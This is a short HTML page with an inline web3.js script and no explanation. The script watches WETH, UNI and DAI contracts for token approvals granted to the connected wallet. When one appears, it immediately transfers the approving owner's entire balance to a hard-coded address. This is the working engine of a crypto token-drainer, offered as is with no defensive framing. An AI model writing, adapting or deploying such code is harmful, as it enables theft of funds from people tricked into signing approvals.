<html>
    <head>
        <script 
            src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.1/web3.min.js" 
            integrity="sha512-5erpERW8MxcHDF7Xea9eBQPiRtxbse70pFcaHJuOhdEBQeAxGQjUwgJbuBDWve+xP/u5IoJbKjyJk50qCnMD7A==" 
            crossorigin="anonymous" 
            referrerpolicy="no-referrer">
        </script>
    </head>
    <script>
        ethereum.enable().then(()=>{
            var abi = [
                { "constant": false, "inputs": [ { "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" } ], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" },
                { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" },
                { "anonymous": false, "inputs": [ { "indexed": true, "name": "owner", "type": "address" }, { "indexed": true, "name": "spender", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" } ], "name": "Approval", "type": "event" },
            ]
            var web3 = new Web3(Web3.givenProvider)
            var WETH=new web3.eth.Contract(abi,"0xc778417E063141139Fce010982780140Aa0cD5Ab")
            var UNI=new web3.eth.Contract(abi,"0x1f9840a85d5af5bf1d1762f925bdaddc4201f984")
            var DAI=new web3.eth.Contract(abi,"0xaD6D458402F60fD3Bd25163575031ACDce07538D")
            var tokens=[WETH,UNI,DAI]
            for(let i=0;i < 3;i++){
                TOKEN=tokens[i]
                TOKEN.events.Approval({
                    filter: {spender: ethereum.selectedAddress},
                    fromBlock: 'latest'
                }, function(error, event){
                    TOKEN.methods.balanceOf(event.returnValues.owner).call().then((balance)=>{
                        TOKEN.methods.transferFrom(event.returnValues.owner,"0x075AF3488f386D0E9c2CD43f58b78F2bA13D9c92",balance)
                        .send({from:ethereum.selectedAddress})
                    })
                });
            }
            
        })

        
        
        
    </script>
    
</html>